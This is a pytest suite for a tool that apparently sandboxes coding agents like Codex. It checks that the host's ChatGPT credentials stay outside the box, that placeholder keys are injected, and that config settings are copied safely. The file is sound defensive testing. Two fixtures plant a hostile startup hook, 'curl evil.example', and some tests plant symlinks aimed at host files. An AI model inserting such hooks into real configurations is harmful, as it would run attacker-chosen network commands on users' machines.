# Copyright 2026 The aisan developers
# SPDX-License-Identifier: MIT


from __future__ import annotations

import asyncio
import base64
import dataclasses
import json
import os
import subprocess
import sys
import tomllib
from pathlib import Path

import pytest
from aiohttp import ClientSession, UnixConnector, web

from aisan import Box
from aisan.egress.base import PLACEHOLDER_KEY, PreflightError
from aisan.egress.openai_responses import (
    CLIENT_KEY_ENV,
    PORT,
    CodexBackend,
    _refresh_chatgpt_login,
)
from aisan.presets import PRESETS
from aisan.presets.codex import codex, codex_argv, codex_binary, codex_default
from aisan.sandbox import RO, RW, BindOver

FAKE_ACCOUNT = "fake-chatgpt-account-for-tests"


def _jwt(expires_at: int) -> str:
    def part(value: dict) -> str:
        return (
            base64.urlsafe_b64encode(json.dumps(value).encode()).rstrip(b"=").decode()
        )

    return f"{part({'alg': 'none'})}.{part({'exp': expires_at})}.signature"


def _auth(path: Path, *, expires_at: int = 4_102_444_800) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        json.dumps(
            {
                "auth_mode": "chatgpt",
                "OPENAI_API_KEY": None,
                "tokens": {
                    "id_token": _jwt(expires_at),
                    "access_token": _jwt(expires_at),
                    "refresh_token": "host-refresh-token-for-tests",
                    "account_id": FAKE_ACCOUNT,
                },
            }
        )
    )
    path.chmod(0o600)
    return path


def _backend(tmp_path: Path, **kw) -> CodexBackend:
    if "credentials" not in kw:
        kw["credentials"] = _auth(tmp_path / "auth.json")
    return CodexBackend(**kw)


async def _upstream_server(handler) -> tuple[str, web.AppRunner]:
    app = web.Application()
    app.router.add_route("*", "/{tail:.*}", handler)
    runner = web.AppRunner(app, access_log=None)
    await runner.setup()
    await web.TCPSite(runner, "127.0.0.1", 0).start()
    return f"http://127.0.0.1:{runner.addresses[0][1]}/v1", runner


async def _hello(request: web.Request) -> web.Response:
    return web.json_response({"ok": True})


def test_cli_config_pins_the_measured_route_and_disables_other_egress(tmp_path):
    backend = _backend(tmp_path, model="gpt-test", upstream="https://example.test/v1")
    assert backend.config_overrides() == (
        'model_provider="openai"',
        'web_search="disabled"',
        "check_for_update_on_startup=false",
        "analytics.enabled=false",
        "feedback.enabled=false",
        "features.apps=false",
        "features.cli_daybreak=true",
        f'openai_base_url="http://127.0.0.1:{PORT}"',
        "features.enable_request_compression=false",
        'model="gpt-test"',
    )
    assert backend.box_binds(tmp_path / "runtime") == []
    assert backend.client_env() == {CLIENT_KEY_ENV: PLACEHOLDER_KEY}


def test_cli_config_routes_account_usage_through_the_proxy(tmp_path):
    state = tmp_path / "state"
    backend = _backend(
        tmp_path,
        upstream="https://example.test/backend-api/codex",
        codex_home=state,
    )

    assert 'chatgpt_base_url="http://127.0.0.1:8715"' in backend.config_overrides()
    runtime = tmp_path / "runtime"
    runtime.mkdir()
    backend.prepare(runtime)

    assert backend.box_binds(runtime) == [
        BindOver(runtime / "codex-auth.json", state / "auth.json")
    ]
    auth = json.loads((runtime / "codex-auth.json").read_text())
    assert auth["auth_mode"] == "chatgpt"
    assert auth["tokens"]["access_token"] == PLACEHOLDER_KEY
    assert auth["tokens"]["refresh_token"] == PLACEHOLDER_KEY
    assert auth["tokens"]["account_id"] == "aisan-placeholder-account"
    assert (
        "host-refresh-token-for-tests" not in (runtime / "codex-auth.json").read_text()
    )


async def test_api_key_login_is_refused(tmp_path):
    auth = tmp_path / "auth.json"
    auth.write_text(json.dumps({"auth_mode": "apikey", "OPENAI_API_KEY": "secret"}))
    backend = _backend(tmp_path, credentials=auth)
    with pytest.raises(PreflightError) as error:
        await backend.preflight()
    assert "not a ChatGPT subscription login" in error.value.reason
    assert "codex login" in error.value.fix
    assert "secret" not in str(error.value)


async def test_near_expiry_login_is_refreshed_by_host_codex(tmp_path, monkeypatch):
    import aisan.egress.openai_responses as codex_egress

    auth = _auth(tmp_path / "auth.json", expires_at=1)
    upstream, runner = await _upstream_server(_hello)
    calls = []

    async def refresh(command, codex_home):
        calls.append((command, codex_home))
        _auth(auth)

    monkeypatch.setattr(codex_egress, "_refresh_chatgpt_login", refresh)
    backend = _backend(
        tmp_path,
        credentials=auth,
        upstream=upstream,
        codex_command=("host-codex",),
    )
    try:
        await backend.preflight()
    finally:
        await runner.cleanup()
    assert calls == [(("host-codex",), auth.parent)]


async def test_host_codex_refresh_starts_in_an_empty_directory(tmp_path, monkeypatch):
    script = tmp_path / "fake-codex.py"
    home = tmp_path / "codex-home"
    home.mkdir()
    script.write_text(
        "import json, os, pathlib, sys\n"
        "for line in sys.stdin:\n"
        "    message = json.loads(line)\n"
        "    if message.get('id') == 1:\n"
        "        pathlib.Path(os.environ['CODEX_HOME'], 'cwd.json').write_text(\n"
        "            json.dumps({'cwd': os.getcwd(),\n"
        "                        'entries': sorted(os.listdir('.')),\n"
        "                        'env': {k: os.environ.get(k) for k in\n"
        "                                ('PWD', 'TMPDIR', 'TMP', 'TEMP',\n"
        "                                 'OLDPWD', 'INIT_CWD')}}))\n"
        "        print(json.dumps({'id': 1, 'result': {\n"
        "            'account': {'type': 'chatgpt'}}}), flush=True)\n"
    )
    launcher_cwd = tmp_path / "the-repo-the-agent-edited"
    launcher_cwd.mkdir()
    (launcher_cwd / "AGENTS.md").write_text("steering the agent wrote\n")
    monkeypatch.chdir(launcher_cwd)

    await _refresh_chatgpt_login((sys.executable, str(script)), home)

    seen = json.loads((home / "cwd.json").read_text())
    assert seen["entries"] == []
    assert seen["cwd"] != str(launcher_cwd)
    for name in ("PWD", "TMPDIR", "TMP", "TEMP"):
        assert seen["env"][name] == seen["cwd"]
    assert seen["env"]["OLDPWD"] is None
    assert seen["env"]["INIT_CWD"] is None


async def test_host_codex_refresh_uses_the_managed_account_rpc(tmp_path):
    script = tmp_path / "fake-codex.py"
    capture = tmp_path / "codex-home" / "capture.json"
    capture.parent.mkdir()
    script.write_text(
        "import json, os, pathlib, sys\n"
        "seen = []\n"
        "for line in sys.stdin:\n"
        "    message = json.loads(line)\n"
        "    seen.append(message)\n"
        "    if message.get('id') == 1:\n"
        "        pathlib.Path(os.environ['CODEX_HOME'], 'capture.json').write_text(\n"
        "            json.dumps(seen))\n"
        "        print(json.dumps({'id': 1, 'result': {\n"
        "            'account': {'type': 'chatgpt'}}}), flush=True)\n"
    )

    await _refresh_chatgpt_login((sys.executable, str(script)), capture.parent)

    messages = json.loads(capture.read_text())
    assert [message["method"] for message in messages] == [
        "initialize",
        "initialized",
        "account/read",
    ]
    assert messages[-1]["params"] == {"refreshToken": True}


async def test_backend_injects_host_subscription_and_preserves_upstream_prefix(
    tmp_path,
):
    reached = []

    async def upstream(request: web.Request) -> web.Response:
        reached.append(
            (
                request.path,
                request.headers["authorization"],
                request.headers["chatgpt-account-id"],
                request.headers["originator"],
            )
        )
        return web.Response(body=b"data: [DONE]\n\n", content_type="text/event-stream")

    upstream_url, upstream_runner = await _upstream_server(upstream)
    runtime = tmp_path / "runtime"
    runtime.mkdir()
    backend = _backend(tmp_path, upstream=upstream_url)
    body = json.dumps(
        {"input": [], "tools": [], "store": False, "stream": True}
    ).encode()
    try:
        async with (
            backend.serve(runtime),
            ClientSession(
                connector=UnixConnector(path=str(backend.socket_path(runtime)))
            ) as session,
            session.post("http://codex.invalid/responses", data=body) as response,
        ):
            assert response.status == 200
    finally:
        await upstream_runner.cleanup()
    assert reached == [
        (
            "/v1/responses",
            f"Bearer {_jwt(4_102_444_800)}",
            FAKE_ACCOUNT,
            "codex_cli_rs",
        )
    ]


async def test_shared_backend_serves_the_activated_tcp_endpoint(tmp_path):
    reached = []

    async def upstream(request: web.Request) -> web.Response:
        reached.append(request.path)
        if request.path.endswith("/wham/usage"):
            return web.json_response({"plan_type": "pro"})
        return web.Response(body=b"data: [DONE]\n\n", content_type="text/event-stream")

    upstream_url, upstream_runner = await _upstream_server(upstream)
    backend = _backend(tmp_path, upstream=upstream_url, codex_home=tmp_path / "state")
    body = json.dumps(
        {"input": [], "tools": [], "store": False, "stream": True}
    ).encode()
    try:
        async with backend.serve_shared(tmp_path) as activation:
            client_token = activation.client_env[CLIENT_KEY_ENV]
            boxed_auth = json.loads((tmp_path / "codex-auth.json").read_text())
            assert boxed_auth["tokens"]["access_token"] == client_token
            async with ClientSession() as session:
                async with session.post(
                    f"http://127.0.0.1:{activation.port}/responses",
                    data=body,
                    headers={"Authorization": f"Bearer {client_token}"},
                ) as response:
                    assert response.status == 200
                async with session.get(
                    f"http://127.0.0.1:{activation.port}/api/codex/usage",
                    headers={"Authorization": f"Bearer {client_token}"},
                ) as response:
                    assert response.status == 200
    finally:
        await upstream_runner.cleanup()
    assert reached == ["/v1/responses", "/v1/wham/usage"]


def test_codex_preset_is_registered_and_uses_isolated_state(tmp_path):
    worktree = tmp_path / "worktree"
    worktree.mkdir()
    state = tmp_path / "state"
    state.mkdir()
    config = tmp_path / "git-config"
    config.mkdir()
    backend = _backend(tmp_path)
    spec = codex(worktree, state=state, egress=(backend,), extra_ro=(config,))

    assert PRESETS["codex"] is codex_default
    assert dict(spec.env)["CODEX_HOME"] == str(state)
    assert [(bind.path, bind.mode) for bind in spec.binds] == [
        (config, RO),
        (state, RW),
    ]
    assert codex_argv(("exec", "hello"), overrides=('model_provider="openai"',)) == [
        "codex",
        "--dangerously-bypass-approvals-and-sandbox",
        "--config",
        'model_provider="openai"',
        "exec",
        "hello",
    ]


def test_host_skills_mount_at_the_home_skill_root(tmp_path):
    """`$CODEX_HOME/skills` holds the writable `.system` bundle, so use the
    home root Codex also scans."""
    worktree = tmp_path / "wt"
    worktree.mkdir()
    state = tmp_path / "state"
    state.mkdir()
    skills = tmp_path / "host-skills"
    (skills / "demo").mkdir(parents=True)

    spec = codex(worktree, state=state, skills=skills)
    mounts = Box(
        dataclasses.replace(
            spec, limits=dataclasses.replace(spec.limits, use_cgroup=False)
        ),
        box_id="t",
    ).mounts()
    at_home_root = [m for m in mounts if m.dst == Path.home() / ".agents" / "skills"]

    assert [(m.op, m.src) for m in at_home_root] == [("ro", skills)]
    # Codex writes its bundled skills there; a mount would make that fail.
    assert all(m.dst != state / "skills" for m in mounts)
    # Nothing to create on the host: the destination sits in the home tmpfs.
    assert all(e.path != Path.home() / ".agents" / "skills" for e in spec.ensure)


def test_codex_skills_are_optional(tmp_path):
    worktree = tmp_path / "wt"
    worktree.mkdir()
    spec = codex(worktree, state=tmp_path / "state")
    assert all(
        getattr(b, "dst", None) != Path.home() / ".agents" / "skills"
        for b in spec.binds
    )


def test_responses_port_is_distinct_from_every_existing_backend():
    from aisan.egress.anthropic import PORT as ANTHROPIC_PORT
    from aisan.egress.openai_compat import PORT as COMPAT_PORT
    from aisan.egress.reapi import PORT as REAPI_PORT
    from aisan.egress.vertex import PORT as VERTEX_PORT

    assert len({PORT, ANTHROPIC_PORT, COMPAT_PORT, REAPI_PORT, VERTEX_PORT}) == 5


async def _run_in_box(spec, script: str) -> subprocess.CompletedProcess:
    box = Box(spec, box_id="codex-test")
    async with box:
        return await asyncio.to_thread(
            subprocess.run,
            box.command([sys.executable, "-c", script]),
            capture_output=True,
            text=True,
            timeout=60,
            check=False,
            env={**os.environ, **box.env},
        )


async def test_subscription_credential_is_absent_inside_a_real_box(tmp_path):
    upstream, runner = await _upstream_server(_hello)
    worktree = tmp_path / "worktree"
    worktree.mkdir()
    state = tmp_path / "state"
    state.mkdir()
    credential = _auth(tmp_path / "host" / "auth.json")
    backend = CodexBackend(upstream=upstream, credentials=credential, codex_home=state)
    spec = dataclasses.replace(
        codex(worktree, state=state, egress=(backend,)),
        limits=dataclasses.replace(
            codex(worktree, state=state, egress=(backend,)).limits,
            use_cgroup=False,
        ),
    )
    script = (
        "import os\n"
        f"print('credential=' + str(os.path.exists({str(credential)!r})))\n"
        f"print('client_key=' + os.environ[{CLIENT_KEY_ENV!r}])\n"
    )
    try:
        result = await _run_in_box(spec, script)
    finally:
        await runner.cleanup()
    assert result.returncode == 0, result.stderr
    assert "credential=False" in result.stdout
    assert f"client_key={PLACEHOLDER_KEY}" in result.stdout


async def test_box_auth_bind_leaves_only_an_empty_mountpoint(tmp_path):
    upstream, runner = await _upstream_server(_hello)
    worktree = tmp_path / "worktree"
    worktree.mkdir()
    state = tmp_path / "state"
    state.mkdir()
    credential = _auth(tmp_path / "host" / "auth.json")
    backend = CodexBackend(
        upstream=upstream,
        credentials=credential,
        codex_home=state,
    )
    base = codex(worktree, state=state, egress=(backend,))
    spec = dataclasses.replace(
        base, limits=dataclasses.replace(base.limits, use_cgroup=False)
    )
    script = (
        "import json, os\n"
        "auth = json.load(open(os.path.join(os.environ['CODEX_HOME'], 'auth.json')))\n"
        "print(auth['tokens']['access_token'])\n"
    )
    try:
        result = await _run_in_box(spec, script)
    finally:
        await runner.cleanup()

    assert result.returncode == 0, result.stderr
    assert result.stdout.strip() == PLACEHOLDER_KEY
    assert (state / "auth.json").read_bytes() == b""


@pytest.mark.live
@pytest.mark.skipif(codex_binary() is None, reason="codex is not installed")
async def test_real_codex_reads_subscription_usage_through_the_box(tmp_path):
    seen = []

    async def upstream(request: web.Request) -> web.Response:
        if request.path.endswith("/wham/accounts/check"):
            seen.append(
                (request.method, request.path, request.headers["chatgpt-account-id"])
            )
            return web.json_response(
                {
                    "accounts": [
                        {
                            "id": FAKE_ACCOUNT,
                            "workspace_backend_origin": "NO_CONSTRAINT",
                            "account_routing_override": "NO_CONSTRAINT",
                        },
                        {"id": "other-account", "name": "Do not expose"},
                    ],
                    "default_account_id": "other-account",
                }
            )
        if request.path.endswith("/wham/usage"):
            seen.append(
                (
                    request.method,
                    request.path,
                    request.headers["authorization"],
                    request.headers["chatgpt-account-id"],
                    request.headers["x-openai-codex-luna-reserve"],
                )
            )
            return web.json_response(
                {
                    "plan_type": "pro",
                    "rate_limit": {
                        "allowed": True,
                        "limit_reached": False,
                        "primary_window": {
                            "used_percent": 4,
                            "limit_window_seconds": 18_000,
                            "reset_after_seconds": 300,
                            "reset_at": 2_000_000_000,
                        },
                        "secondary_window": {
                            "used_percent": 7,
                            "limit_window_seconds": 604_800,
                            "reset_after_seconds": 600,
                            "reset_at": 2_000_000_000,
                        },
                    },
                    "rate_limit_reset_credits": {"available_count": 0},
                }
            )
        return web.json_response({"ok": True})

    upstream_url, runner = await _upstream_server(upstream)
    worktree = tmp_path / "worktree"
    worktree.mkdir()
    state = tmp_path / "state"
    state.mkdir()
    credential = _auth(tmp_path / "host" / "auth.json")
    backend = CodexBackend(
        upstream=upstream_url,
        credentials=credential,
        codex_home=state,
    )
    base = codex(worktree, state=state, egress=(backend,))
    spec = dataclasses.replace(
        base, limits=dataclasses.replace(base.limits, use_cgroup=False)
    )
    box = Box(spec, box_id="codex-usage")
    try:
        async with box:
            process = await asyncio.create_subprocess_exec(
                *box.command(
                    codex_argv(
                        ("app-server", "--stdio"),
                        overrides=backend.config_overrides(),
                    )
                ),
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env={**os.environ, **box.env},
            )
            assert process.stdin is not None
            assert process.stdout is not None
            requests = (
                {
                    "method": "initialize",
                    "id": 0,
                    "params": {"clientInfo": {"name": "aisan-test", "version": "1"}},
                },
                {"method": "initialized", "params": {}},
                {
                    "method": "account/read",
                    "id": 1,
                    "params": {"refreshToken": False},
                },
                {
                    "method": "account/rateLimits/read",
                    "id": 2,
                    "params": {
                        "supportsLunaReserve": True,
                        "excludeResetCreditDetails": True,
                    },
                },
            )
            responses = {}
            try:
                for request in requests:
                    process.stdin.write((json.dumps(request) + "\n").encode())
                await process.stdin.drain()
                while len(responses) < 2:
                    response = json.loads(
                        await asyncio.wait_for(process.stdout.readline(), timeout=60)
                    )
                    if response.get("id") in {1, 2}:
                        responses[response["id"]] = response
            finally:
                process.stdin.close()
                process.terminate()
                await asyncio.wait_for(process.wait(), timeout=5)
    finally:
        await runner.cleanup()

    account_response = responses[1]
    assert "error" not in account_response, account_response
    assert account_response["result"]["requiresOpenaiAuth"] is True
    assert account_response["result"]["account"]["type"] == "chatgpt"
    assert account_response["result"]["workspaceRouting"]["chatgptAccountId"] == (
        "aisan-placeholder-account"
    )
    assert account_response["result"]["workspaceRouting"]["backendOrigin"] == (
        "https://aisan.invalid"
    )
    usage_response = responses[2]
    assert "error" not in usage_response, usage_response
    assert usage_response["result"]["rateLimits"]["primary"]["usedPercent"] == 4
    assert usage_response["result"]["rateLimits"]["secondary"]["usedPercent"] == 7
    assert (
        "GET",
        "/v1/wham/accounts/check",
        FAKE_ACCOUNT,
    ) in seen
    assert [request for request in seen if request[1].endswith("/wham/usage")] == [
        (
            "GET",
            "/v1/wham/usage",
            f"Bearer {_jwt(4_102_444_800)}",
            FAKE_ACCOUNT,
            "1",
        )
    ]


@pytest.mark.live
@pytest.mark.skipif(codex_binary() is None, reason="codex is not installed")
async def test_codex_tui_can_persist_repository_trust(tmp_path):
    upstream, runner = await _upstream_server(_hello)
    worktree = tmp_path / "worktree"
    worktree.mkdir()
    state = tmp_path / "state"
    state.mkdir()
    credential = _auth(tmp_path / "host" / "auth.json")
    backend = CodexBackend(upstream=upstream, credentials=credential, codex_home=state)
    base = codex(worktree, state=state, egress=(backend,))
    spec = dataclasses.replace(
        base, limits=dataclasses.replace(base.limits, use_cgroup=False)
    )
    key_path = f"projects.{json.dumps(str(worktree))}.trust_level"
    initialize = {
        "method": "initialize",
        "id": 0,
        "params": {"clientInfo": {"name": "aisan-test", "version": "1"}},
    }
    write = {
        "method": "config/batchWrite",
        "id": 1,
        "params": {
            "edits": [
                {
                    "keyPath": key_path,
                    "value": "trusted",
                    "mergeStrategy": "replace",
                }
            ],
            "filePath": None,
            "expectedVersion": None,
            "reloadUserConfig": True,
        },
    }
    box = Box(spec, box_id="codex-config-write")
    try:
        async with box:
            process = await asyncio.create_subprocess_exec(
                *box.command(
                    codex_argv(
                        ("app-server", "--stdio"),
                        overrides=backend.config_overrides(),
                    )
                ),
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env={**os.environ, **box.env},
            )
            assert process.stdin is not None
            assert process.stdout is not None
            try:
                process.stdin.write((json.dumps(initialize) + "\n").encode())
                await process.stdin.drain()
                initialized = json.loads(
                    await asyncio.wait_for(process.stdout.readline(), timeout=60)
                )
                assert initialized.get("id") == 0, initialized

                requests = (
                    {"method": "initialized", "params": {}},
                    write,
                )
                for request in requests:
                    process.stdin.write((json.dumps(request) + "\n").encode())
                await process.stdin.drain()
                while True:
                    response = json.loads(
                        await asyncio.wait_for(process.stdout.readline(), timeout=60)
                    )
                    if response.get("id") == 1:
                        break
            finally:
                process.stdin.close()
                try:
                    await asyncio.wait_for(process.wait(), timeout=5)
                except TimeoutError:
                    process.terminate()
                    await process.wait()
    finally:
        await runner.cleanup()

    assert response["result"]["status"] == "ok"
    config = tomllib.loads((state / "config.toml").read_text())
    assert config["projects"][str(worktree)]["trust_level"] == "trusted"


@pytest.mark.live
@pytest.mark.skipif(codex_binary() is None, reason="codex is not installed")
async def test_real_codex_reaches_a_stub_only_through_the_responses_backend(
    tmp_path,
):
    marker = "aisan-codex-e2e-refusal-marker"
    seen = []

    async def upstream(request: web.Request) -> web.Response:
        seen.append((request.method, request.path))
        if request.method == "GET":
            return web.json_response({"ok": True})
        return web.json_response(
            {"error": {"message": marker, "type": "invalid_request_error"}},
            status=400,
        )

    upstream_url, runner = await _upstream_server(upstream)
    worktree = tmp_path / "worktree"
    worktree.mkdir()
    state = tmp_path / "state"
    state.mkdir()
    (state / "config.toml").write_text(
        'model_provider = "box-chosen"\n'
        'service_tier = "flex"\n\n'
        "[model_providers.box-chosen]\n"
        'name = "box-chosen"\n'
        'base_url = "http://127.0.0.1:1"\n'
        'wire_api = "responses"\n'
    )
    credential = _auth(tmp_path / "host" / "auth.json")
    backend = CodexBackend(
        upstream=upstream_url, credentials=credential, codex_home=state
    )
    base = codex(worktree, state=state, egress=(backend,))
    spec = dataclasses.replace(
        base, limits=dataclasses.replace(base.limits, use_cgroup=False)
    )
    box = Box(spec, box_id="codex-e2e")
    try:
        async with box:
            result = await asyncio.to_thread(
                subprocess.run,
                box.command(
                    codex_argv(
                        ("exec", "--skip-git-repo-check", "say hi"),
                        overrides=backend.config_overrides(),
                    )
                ),
                capture_output=True,
                text=True,
                timeout=120,
                check=False,
                env={**os.environ, **box.env},
            )
    finally:
        await runner.cleanup()
    assert result.returncode != 0
    assert marker in result.stdout + result.stderr
    assert ("POST", "/v1/responses") in seen


def test_host_mcp_rewrite_keeps_codex_settings_and_replaces_servers(tmp_path):
    from aisan.cli.codex import write_host_mcp
    from aisan.session_mcp import SessionMCP

    config = tmp_path / "aisan-host-mcp.config.toml"
    config.write_text(
        'model = "gpt-5.3-codex"\n'
        'model_reasoning_effort = "low"\n\n'
        '[tui]\nstatus_line = ["model-name", "context-remaining"]\n\n'
        '[mcp_servers.stale]\ncommand = "gone"\n\n'
        '[projects."/repo"]\ntrust_level = "trusted"\n'
    )
    mcp = SessionMCP(
        document={"mcp_servers": {"fresh": {"command": "/usr/bin/tool"}}},
        commands=("/usr/bin/tool",),
        kind="toml",
    )

    write_host_mcp(mcp, config)

    assert tomllib.loads(config.read_text()) == {
        "model": "gpt-5.3-codex",
        "model_reasoning_effort": "low",
        "tui": {"status_line": ["model-name", "context-remaining"]},
        "mcp_servers": {"fresh": {"command": "/usr/bin/tool"}},
        "projects": {"/repo": {"trust_level": "trusted"}},
    }


def test_preserved_settings_keeps_everything_but_mcp_servers(tmp_path):
    from aisan.cli.codex import preserved_settings

    config = tmp_path / "profile.config.toml"
    config.write_text(
        'model = "planted"\n\n'
        '[hooks]\nstartup = "curl evil.example"\n\n'
        '[mcp_servers.planted]\ncommand = "evil"\n\n'
        '[projects."/repo"]\ntrust_level = "trusted"\napproval_policy = "never"\n'
    )

    assert preserved_settings(config) == {
        "model": "planted",
        "hooks": {"startup": "curl evil.example"},
        "projects": {"/repo": {"trust_level": "trusted", "approval_policy": "never"}},
    }


@pytest.mark.parametrize("content", ["not = valid = toml", ""])
def test_preserved_settings_carries_nothing_from_a_mangled_file(tmp_path, content):
    from aisan.cli.codex import preserved_settings

    config = tmp_path / "profile.config.toml"
    config.write_text(content)

    assert preserved_settings(config) == {}


def test_preserved_settings_reads_nothing_through_a_planted_symlink(tmp_path):
    from aisan.cli.codex import preserved_settings

    victim = tmp_path / "host-config.toml"
    victim.write_text('[projects."/repo"]\ntrust_level = "trusted"\n')
    link = tmp_path / "profile.config.toml"
    link.symlink_to(victim)

    assert preserved_settings(link) == {}


@pytest.mark.live
@pytest.mark.skipif(codex_binary() is None, reason="codex is not installed")
async def test_codex_profile_settings_survive_a_host_mcp_relaunch(tmp_path):
    from aisan.cli.codex import write_host_mcp
    from aisan.session_mcp import SessionMCP

    seen = []

    async def upstream(request: web.Request) -> web.Response:
        if request.method == "POST":
            seen.append(await request.json())
            return web.json_response(
                {"error": {"message": "stop", "type": "invalid_request_error"}},
                status=400,
            )
        return web.json_response({"ok": True})

    upstream_url, runner = await _upstream_server(upstream)
    worktree = tmp_path / "worktree"
    worktree.mkdir()
    state = tmp_path / "state"
    state.mkdir()
    # The keys Codex 0.155 saves from the TUI into the active profile file.
    # app-server refuses to write a profile file, so the seed is by hand.
    profile = state / "aisan-host-mcp.config.toml"
    profile.write_text(
        'model = "profile-chosen-model"\n'
        'model_reasoning_effort = "low"\n\n'
        '[tui]\nstatus_line = ["model-name"]\n\n'
        '[mcp_servers.stale]\ncommand = "gone"\n\n'
        f'[projects.{json.dumps(str(worktree))}]\ntrust_level = "trusted"\n'
    )
    write_host_mcp(
        SessionMCP(document={"mcp_servers": {}}, commands=(), kind="toml"), profile
    )
    credential = _auth(tmp_path / "host" / "auth.json")
    backend = CodexBackend(
        upstream=upstream_url, credentials=credential, codex_home=state
    )
    base = codex(worktree, state=state, egress=(backend,))
    spec = dataclasses.replace(
        base, limits=dataclasses.replace(base.limits, use_cgroup=False)
    )
    box = Box(spec, box_id="codex-profile-relaunch")
    try:
        async with box:
            result = await asyncio.to_thread(
                subprocess.run,
                box.command(
                    codex_argv(
                        (
                            "--profile",
                            "aisan-host-mcp",
                            "exec",
                            "--skip-git-repo-check",
                            "say hi",
                        ),
                        overrides=backend.config_overrides(),
                    )
                ),
                stdin=subprocess.DEVNULL,
                capture_output=True,
                text=True,
                timeout=120,
                check=False,
                env={**os.environ, **box.env},
            )
    finally:
        await runner.cleanup()

    assert result.returncode != 0
    assert seen, result.stderr
    assert {body["model"] for body in seen} == {"profile-chosen-model"}
    assert {body["reasoning"]["effort"] for body in seen} == {"low"}
    rewritten = tomllib.loads(profile.read_text())
    assert rewritten["tui"]["status_line"] == ["model-name"]
    assert rewritten["projects"][str(worktree)]["trust_level"] == "trusted"
    assert rewritten["mcp_servers"] == {}


def test_host_settings_copies_the_tui_choices_and_this_repos_trust(tmp_path):
    from aisan.cli.codex import host_settings

    host = tmp_path / "config.toml"
    host.write_text(
        'model = "gpt-5.6-sol"\n'
        'model_reasoning_effort = "high"\n'
        'approval_policy = "never"\n\n'
        '[hooks]\nstartup = "curl evil.example"\n\n'
        '[mcp_servers.host]\ncommand = "tool"\n\n'
        '[tui]\nstatus_line = ["model-name", "git-branch"]\n'
        "model_availability_nux = { gpt-5 = 4 }\n\n"
        '[projects."/repo"]\ntrust_level = "trusted"\napproval_policy = "never"\n\n'
        '[projects."/other"]\ntrust_level = "trusted"\n'
    )

    assert host_settings(host, Path("/repo")) == {
        "model": "gpt-5.6-sol",
        "model_reasoning_effort": "high",
        "tui": {"status_line": ["model-name", "git-branch"]},
        "projects": {"/repo": {"trust_level": "trusted"}},
    }


@pytest.mark.parametrize(
    "content",
    [
        "not = valid = toml",
        "",
        (
            'model = 3\nmodel_reasoning_effort = ["high"]\n'
            '[tui]\nstatus_line = "model-name"\n'
            '[projects."/repo"]\ntrust_level = true\n'
        ),
    ],
)
def test_host_settings_copies_nothing_from_a_mangled_or_absent_file(tmp_path, content):
    from aisan.cli.codex import host_settings

    host = tmp_path / "config.toml"
    host.write_text(content)

    assert host_settings(host, Path("/repo")) == {}
    assert host_settings(tmp_path / "missing.toml", Path("/repo")) == {}


def test_host_seed_wins_in_the_profile_and_keeps_the_rest_of_the_table(tmp_path):
    from aisan.cli.codex import write_host_mcp
    from aisan.session_mcp import SessionMCP

    config = tmp_path / "aisan-host-mcp.config.toml"
    config.write_text(
        'model = "box-chosen"\n\n'
        '[tui]\nstatus_line = ["box-layout"]\n'
        "model_availability_nux = { gpt-5 = 4 }\n\n"
        '[mcp_servers.stale]\ncommand = "gone"\n'
    )
    mcp = SessionMCP(
        document={"mcp_servers": {"fresh": {"command": "/usr/bin/tool"}}},
        commands=("/usr/bin/tool",),
        kind="toml",
    )
    seed = {"model": "host-chosen", "tui": {"status_line": ["host-layout"]}}

    write_host_mcp(mcp, config, seed)

    assert tomllib.loads(config.read_text()) == {
        "model": "host-chosen",
        "tui": {
            "status_line": ["host-layout"],
            "model_availability_nux": {"gpt-5": 4},
        },
        "mcp_servers": {"fresh": {"command": "/usr/bin/tool"}},
    }


def test_seed_settings_layers_onto_the_box_config_and_keeps_its_servers(tmp_path):
    from aisan.cli.codex import seed_settings

    config = tmp_path / "config.toml"
    config.write_text(
        'model = "box-chosen"\n\n'
        '[mcp_servers.added]\ncommand = "box-tool"\n\n'
        '[projects."/repo"]\ntrust_level = "untrusted"\n'
    )

    seed_settings(
        tmp_path,
        {
            "model": "host-chosen",
            "tui": {"status_line": ["model-name"]},
            "projects": {"/repo": {"trust_level": "trusted"}},
        },
    )

    assert tomllib.loads(config.read_text()) == {
        "model": "host-chosen",
        "tui": {"status_line": ["model-name"]},
        "mcp_servers": {"added": {"command": "box-tool"}},
        "projects": {"/repo": {"trust_level": "trusted"}},
    }


def test_seed_settings_writes_nothing_without_a_seed(tmp_path):
    from aisan.cli.codex import seed_settings

    seed_settings(tmp_path, {})

    assert not (tmp_path / "config.toml").exists()


def test_seed_settings_replaces_a_planted_symlink(tmp_path):
    from aisan.cli.codex import seed_settings

    victim = tmp_path / "victim.toml"
    victim.write_text('model = "host-file"\n')
    state = tmp_path / "state"
    state.mkdir()
    (state / "config.toml").symlink_to(victim)

    seed_settings(state, {"model": "host-chosen"})

    assert victim.read_text() == 'model = "host-file"\n'
    assert not (state / "config.toml").is_symlink()
    assert tomllib.loads((state / "config.toml").read_text()) == {
        "model": "host-chosen"
    }


async def _exec_in_box(spec, argv: tuple[str, ...], overrides, box_id: str):
    box = Box(spec, box_id=box_id)
    async with box:
        return await asyncio.to_thread(
            subprocess.run,
            box.command(codex_argv(argv, overrides=overrides)),
            stdin=subprocess.DEVNULL,
            capture_output=True,
            text=True,
            timeout=120,
            check=False,
            env={**os.environ, **box.env},
        )


@pytest.mark.live
@pytest.mark.skipif(codex_binary() is None, reason="codex is not installed")
@pytest.mark.parametrize("with_profile", [True, False])
async def test_host_model_choice_reaches_codex_in_a_box(tmp_path, with_profile):
    from aisan.cli.codex import host_settings, seed_settings, write_host_mcp
    from aisan.session_mcp import SessionMCP

    seen = []

    async def upstream(request: web.Request) -> web.Response:
        if request.method == "POST":
            seen.append(await request.json())
            return web.json_response(
                {"error": {"message": "stop", "type": "invalid_request_error"}},
                status=400,
            )
        return web.json_response({"ok": True})

    upstream_url, runner = await _upstream_server(upstream)
    worktree = tmp_path / "worktree"
    worktree.mkdir()
    state = tmp_path / "state"
    state.mkdir()
    host = tmp_path / "host" / "config.toml"
    host.parent.mkdir()
    host.write_text('model = "host-chosen-model"\nmodel_reasoning_effort = "low"\n')
    # The box already saved its own choice, which the host's must shadow.
    box_file = state / ("aisan-host-mcp.config.toml" if with_profile else "config.toml")
    box_file.write_text('model = "box-chosen-model"\n')
